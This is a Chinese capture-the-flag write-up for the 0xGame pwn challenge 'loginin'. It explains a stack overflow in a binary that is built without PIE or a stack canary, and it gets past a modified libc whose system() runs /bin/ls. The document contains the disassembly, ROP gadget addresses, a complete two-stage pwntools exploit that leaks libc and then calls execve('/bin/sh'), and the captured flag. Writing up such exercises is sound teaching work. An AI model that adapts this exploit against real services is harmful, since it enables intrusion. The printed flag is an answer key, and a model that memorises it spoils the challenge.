---
title: "loginin：绕过魔改 libc 的 ret2libc"
date: "2026-10-07"
categories: "Pwn"
tags: ["ROP", "ret2libc", "栈溢出"]
excerpt: "先泄露 libc，再使用 execve 绕过题目修改过的 system 路径，完成两阶段 ROP。"
slug: "pwn-loginin"
source_event: "0xGame"
---

> 复现材料：`pwn`、`libc.so.6`。赛题附件未随文章打包。

## 思路概览

题目是一个无 PIE、无 Canary 的 ret2libc 栈溢出。难点不在泄露 libc，而在题目给的 `libc.so.6` 被魔改：传统 `system("/bin/sh")` 不稳定，因为 libc 内部 shell 路径被改成了 `/bin/ls`；直接调用 `execve("/bin/sh", NULL, NULL)` 即可绕过。

## 解题过程

### Step 1: 确认漏洞与保护

`vuln()` 中局部缓冲区只有 `0x20` 字节，但 `read(0, buf, 0x100)` 可覆盖返回地址：

```asm
401214: sub    rsp,0x20
401227: lea    rax,[rbp-0x20]
40122b: mov    edx,0x100
401238: call   read@plt
40124d: leave
40124e: ret
```

返回地址偏移为 `0x20 + 8 = 40`。程序无 PIE，且自带可用 gadget：

```text
0x40119e: pop rdi; ret
0x4011a0: pop rsi; ret
0x4011a2: pop rdx; ret
```

`main()` 里有一次性标志，返回 `main` 会触发退出；所以第一阶段泄露后返回 `vuln`，不要返回 `main`。

### Step 2: 泄露 libc 并避开魔改 system

第一阶段调用 `puts(puts@got)` 泄露 libc 基址，然后回到 `vuln` 继续读第二阶段。

题目 libc 中没有正常的 `/bin/sh` 路径，反而能看到 `system` 附近的字符串：

```text
0x1d8676: "-c"
0x1d8679: "/bin/ls"
0x1d8680: "exit 0"
```

因此不走 `system`，而是：

1. ROP 调用 `read(0, .bss, 8)` 写入 `/bin/sh\0`；
2. ROP 调用 libc 的 `execve(.bss, 0, 0)`。

完整脚本：

```python
#!/usr/bin/env python3
from pathlib import Path
from pwn import *

HOST = "challenge.example.invalid"
PORT = 41433
OFFSET = 40
BSS = 0x404800

context.arch = "amd64"
context.log_level = "info"

root = Path(__file__).resolve().parent
elf = ELF(root / "pwn")
libc = ELF(root / "libc.so.6")

pop_rdi = 0x40119e
pop_rsi = 0x4011a0
pop_rdx = 0x4011a2


def start():
    host = args.HOST or HOST
    port = int(args.PORT or PORT)
    return remote(host, port)


def main():
    io = start()

    stage1 = flat(
        b"A" * OFFSET,
        pop_rdi, elf.got.puts,
        elf.plt.puts,
        elf.sym.vuln,
    )
    io.recvuntil(b"Input your payload:")
    io.send(stage1)
    io.recvuntil(b"Done!\n")

    puts_addr = u64(io.recvline().strip().ljust(8, b"\0"))
    libc.address = puts_addr - libc.sym.puts
    log.success(f"puts = {puts_addr:#x}")
    log.success(f"libc = {libc.address:#x}")

    stage2 = flat(
        b"B" * OFFSET,
        pop_rdi, 0,
        pop_rsi, BSS,
        pop_rdx, 8,
        elf.plt.read,
        pop_rdi, BSS,
        pop_rsi, 0,
        pop_rdx, 0,
        libc.sym.execve,
    )
    io.recvuntil(b"Input your payload:")
    io.send(stage2)
    io.recvuntil(b"Done!\n")
    io.send(b"/bin/sh\0")

    io.sendline(b"cat flag; cat /flag 2>/dev/null")
    print(io.recvrepeat(2).decode(errors="replace"), end="")
    io.close()


if __name__ == "__main__":
    main()
```

### Step 3: 验证

```powershell
py -3.11 .\solve.py
```

实际远程输出：

```text
[+] puts = 0x7f86a89cce50
[+] libc = 0x7f86a894c000
0xGame{cfdda5e3-e376-4170-acc1-42a679f0386a}
```

## 最终结果

```text
0xGame{cfdda5e3-e376-4170-acc1-42a679f0386a}
```
